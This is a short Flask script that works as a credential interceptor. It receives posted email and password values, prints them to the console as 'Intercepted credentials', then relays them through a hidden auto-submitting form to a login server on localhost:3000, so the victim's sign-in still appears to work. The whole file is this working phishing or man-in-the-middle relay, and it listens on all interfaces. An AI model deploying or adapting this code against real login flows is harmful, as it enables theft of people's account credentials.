from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

@app.route('/intercept', methods=['POST'])
def intercept():
    email = request.form.get('email')
    password = request.form.get('password')
    
    print("Intercepted credentials:")
    print(f"Email: {email}")
    print(f"Password: {password}")
    
    # Render a form that will post the data to the login server
    return render_template_string('''
    <html>
        <body>
            <form id="redirectForm" action="http://localhost:3000/login" method="POST">
                <input type="hidden" name="email" value="{{ email }}">
                <input type="hidden" name="password" value="{{ password }}">
            </form>
            <script type="text/javascript">
                document.getElementById("redirectForm").submit();
            </script>
        </body>
    </html>
    ''', email=email, password=password)

if __name__ == '__main__':
    print("Interceptor starting on port 3001...")
    app.run(host='0.0.0.0', port=3001)
